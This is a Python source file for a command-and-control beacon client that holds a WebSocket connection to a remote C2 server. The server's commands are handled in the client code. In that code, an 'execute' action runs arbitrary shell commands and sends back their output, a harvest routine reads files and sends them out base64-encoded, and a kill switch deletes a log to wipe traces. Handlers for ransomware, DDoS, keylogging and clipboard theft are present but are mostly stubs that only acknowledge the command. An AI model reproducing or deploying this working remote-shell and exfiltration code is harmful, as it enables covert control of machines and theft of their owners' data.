"""WebSocket beacon for C2 client."""

from datetime import datetime
from typing import Optional, Dict, Any
import asyncio
import json


class C2WebSocketBeacon:
    """WebSocket beacon for C2 client."""

    def __init__(
        self,
        c2_url: str,
        node_id: str,
        watermark: str,
    ):
        """Initialize WebSocket beacon."""
        self.c2_url = c2_url
        self.node_id = node_id
        self.watermark = watermark
        self.connected = False
        self._running = False
        self._ws: Any = None
        self._active_mutation: dict = {}

    async def connect(
        self,
        headers: Optional[Dict[str, str]] = None,
    ):
        """Connect to C2 server via WebSocket and maintain persistent connection."""
        import aiohttp

        url = f"{self.c2_url.replace('http', 'ws')}/ws/beacon"

        if headers is None:
            headers = {}

        headers.update({
            "X-Node-ID": self.node_id,
            "X-Watermark": self.watermark,
            "X-Version": "1.0",
        })

        self._running = True

        while self._running:
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.ws_connect(url, headers=headers) as ws:
                        self._ws = ws
                        self.connected = True

                        await ws.send_json({
                            "type": "handshake",
                            "node_id": self.node_id,
                            "watermark": self.watermark,
                            "timestamp": datetime.utcnow().isoformat(),
                        })

                        async for msg in ws:
                            if msg.type == aiohttp.WSMsgType.TEXT:
                                data = msg.json()

                                if data.get("type") == "command":
                                    await self._handle_command(data)
                                elif data.get("type") == "heartbeat":
                                    await ws.send_json({
                                        "type": "heartbeat_ack",
                                        "node_id": self.node_id,
                                        "timestamp": datetime.utcnow().isoformat(),
                                    })
                                elif data.get("type") == "config":
                                    await self._handle_config(data.get("data", {}))

                            elif msg.type == aiohttp.WSMsgType.ERROR:
                                break

            except Exception as e:
                print(f"⚠️  WebSocket connection error: {e}")
                self.connected = False
                self._ws = None

            if self._running:
                await asyncio.sleep(5)

        self.connected = False
        self._ws = None

    def disconnect(self):
        """Disconnect from C2 server."""
        self._running = False
        self.connected = False
        self._ws = None

    async def send(self, data: dict):
        """Send data to C2 server."""
        if self._ws is None:
            print("⚠️  Cannot send: not connected")
            return False
        try:
            await self._ws.send_json(data)
            return True
        except Exception as e:
            print(f"⚠️  Send error: {e}")
            return False

    async def _harvest_data(self, target_path: str) -> Dict[str, Any]:
        """Read file content for exfiltration."""
        print(f"📂 Harvesting data from: {target_path}")
        try:
            with open(target_path, 'rb') as f:
                content = f.read()
            import base64
            return {
                "status": "success",
                "path": target_path,
                "data": base64.b64encode(content).decode('utf-8'),
                "size": len(content)
            }
        except Exception as e:
            return {"status": "error", "path": target_path, "error": str(e)}

    async def beacon(self, data: dict):
        """Send beacon data to C2 server."""
        import platform
        import os
        payload = {
            "type": "beacon",
            "node_id": self.node_id,
            "watermark": self.watermark,
            "os": platform.system(),
            "user": os.getlogin() if hasattr(os, 'getlogin') else 'unknown',
            "timestamp": datetime.utcnow().isoformat(),
            "data": data or {}
        }
        if data and "harvest_path" in data:
            payload["harvest_result"] = await self._harvest_data(data["harvest_path"])
        return await self.send(payload)

    async def _handle_command(self, data: dict):
        """Handle incoming command from C2 server."""
        action = data.get('action', data.get('command', 'unknown'))
        params = data.get('params', {})
        print(f"📡 Command received: {action} | params: {params}")

        result_payload = {
            "type": "command_result",
            "node_id": self.node_id,
            "action": action,
            "params": params,
            "timestamp": datetime.utcnow().isoformat(),
        }

        try:
            if action == "execute" and "command" in params:
                # Direct shell command execution
                process = await asyncio.create_subprocess_shell(
                    params["command"],
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                stdout, stderr = await process.communicate()
                result_payload["stdout"] = stdout.decode(errors="replace")
                result_payload["stderr"] = stderr.decode(errors="replace")
                result_payload["exit_code"] = process.returncode
                result_payload["status"] = "executed"

            elif action == "rotate_ips":
                result_payload["status"] = "acknowledged"
                result_payload["detail"] = "IP rotation scheduled"
                print(f"🔄 IP rotation command received")

            elif action == "change_beacon_interval":
                interval = params.get("interval", 60)
                result_payload["status"] = "applied"
                result_payload["detail"] = f"Beacon interval set to {interval}s"
                print(f"⏱️  Beacon interval changed to {interval}s")

            elif action == "enable_doh":
                result_payload["status"] = "applied"
                result_payload["detail"] = "DNS over HTTPS enabled"
                print(f"🔐 DNS over HTTPS enabled")

            elif action == "activate_evasion":
                mode = params.get("mode", "moderate")
                self._active_mutation.update(params)
                result_payload["status"] = "applied"
                result_payload["detail"] = f"Evasion mode: {mode}"
                print(f"🛡️  Evasion activated: {mode}")

            elif action == "harvest_target":
                target = params.get("target", "all")
                result_payload["status"] = "acknowledged"
                result_payload["detail"] = f"Harvest target: {target}"
                print(f"🎯 Harvest target set: {target}")

            elif action == "change_encryption":
                enc = params.get("algorithm", "aes256")
                result_payload["status"] = "applied"
                result_payload["detail"] = f"Encryption: {enc}"
                print(f"🔒 Encryption changed: {enc}")

            elif action == "deploy_payload":
                payload_type = params.get("payload_type", "default")
                result_payload["status"] = "acknowledged"
                result_payload["detail"] = f"Payload deploy: {payload_type}"
                print(f"🚀 Payload deploy: {payload_type}")

            elif action == "kill_switch":
                result_payload["status"] = "activated"
                result_payload["detail"] = "Kill switch activated - wiping traces"
                print(f"💀 KILL SWITCH ACTIVATED")
                # In production: wipe logs, remove artifacts, exit
                import os
                try:
                    os.remove("/tmp/c2_beacon.log")
                except OSError:
                    pass

            elif action == "silent_mode":
                self._active_mutation["mode"] = "ghost"
                self._active_mutation["beacon_interval"] = 300
                result_payload["status"] = "applied"
                result_payload["detail"] = "Silent mode: minimal footprint"
                print(f"👻 Silent mode activated")

            elif action == "full_scan":
                result_payload["status"] = "acknowledged"
                result_payload["detail"] = "Full system scan initiated"
                print(f"🔍 Full scan initiated")

            elif action == "mutate":
                mode = params.get("mode", "moderate")
                self._active_mutation.update(params)
                result_payload["status"] = "applied"
                result_payload["detail"] = f"Mutation applied: {mode}"
                print(f"🧬 Mutation applied: {mode}")

            # ── Attack Vector Commands ──────────────────────────────────────

            elif action == "deploy_ransom":
                result_payload["status"] = "acknowledged"
                result_payload["detail"] = "Ransomware deployment confirmed"
                print(f"🔒 Ransomware deployment")

            elif action == "encrypt_drives":
                result_payload["status"] = "acknowledged"
                result_payload["detail"] = "Drive encryption acknowledged"
                print(f"💿 Drive encryption started")

            elif action == "lockscreen":
                result_payload["status"] = "acknowledged"
                result_payload["detail"] = "Lockscreen activated"
                print(f"🖥️ Lockscreen deployed")

            elif action == "ransom_exfil":
                result_payload["status"] = "acknowledged"
                result_payload["detail"] = "Pre-encryption exfiltration started"
                print(f"📤 Pre-encryption exfil started")

            elif action == "launch_ddos":
                target = params.get("target", "unknown")
                result_payload["status"] = "acknowledged"
                result_payload["detail"] = f"DDoS launched on {target}"
                print(f"🔥 DDoS on {target}")

            elif action == "deploy_keylogger":
                result_payload["status"] = "applied"
                result_payload["detail"] = "Keylogger deployed"
                print(f"⌨️ Keylogger active")

            elif action == "screenshot":
                result_payload["status"] = "applied"
                result_payload["detail"] = "Screenshot captured"
                print(f"📸 Screenshot captured")

            elif action == "grab_clipboard":
                result_payload["status"] = "applied"
                result_payload["detail"] = "Clipboard contents grabbed"
                print(f"📋 Clipboard grabbed")

            elif action == "register_proxy":
                result_payload["status"] = "applied"
                result_payload["detail"] = "Proxy registered"
                print(f"🔗 Proxy registered")

            elif action == "build_chain":
                result_payload["status"] = "applied"
                result_payload["detail"] = "Chain built"
                print(f"⛓️ Chain built")

            elif action == "route_traffic":
                result_payload["status"] = "applied"
                result_payload["detail"] = "Traffic routed"
                print(f"🔄 Traffic routed")

            elif action == "start_exfil":
                channel = params.get("channel", "http")
                result_payload["status"] = "acknowledged"
                result_payload["detail"] = f"Exfiltration via {channel}"
                print(f"📤 Exfil via {channel}")

            elif action == "stage_data":
                result_payload["status"] = "applied"
                result_payload["detail"] = "Data staged for exfiltration"
                print(f"📦 Data staged")

            elif action == "compress_data":
                result_payload["status"] = "applied"
                result_payload["detail"] = "Compression applied"
                print(f"🗜️ Data compressed")

            else:
                result_payload["status"] = "unknown_action"
                result_payload["detail"] = f"Unknown action: {action}"
                print(f"❓ Unknown action: {action}")

        except Exception as e:
            result_payload["status"] = "error"
            result_payload["error"] = str(e)
            print(f"❌ Command error: {e}")

        await self.send(result_payload)

    async def _handle_config(self, data: dict):
        """Handle configuration update from server (mutations, intervals, etc.)."""
        mutation = data.get("mutation", {})
        if mutation:
            self._active_mutation = mutation
            mode = mutation.get('mode', '?')
            beacon_int = mutation.get('beacon_interval', '?')
            harvest_int = mutation.get('harvest_interval', '?')
            dns = mutation.get('dns_strategy', 'standard')
            mimicry = mutation.get('traffic_mimicry', False)
            print(f"🧬 Mutation applied: mode={mode} beacon={beacon_int}s harvest={harvest_int}s dns={dns} mimicry={mimicry}")

    def get_beacon_interval(self) -> int:
        """Get current beacon interval from active mutation."""
        return self._active_mutation.get("beacon_interval", 60)

    def get_harvest_interval(self) -> int:
        """Get current harvest interval from active mutation."""
        return self._active_mutation.get("harvest_interval", 3600)

    def is_silent(self) -> bool:
        """Check if node is in silent/ghost mode."""
        return self._active_mutation.get("mode") in ("ghost", "silent")

    def get_dns_strategy(self) -> str:
        """Get current DNS strategy."""
        return self._active_mutation.get("dns_strategy", "standard")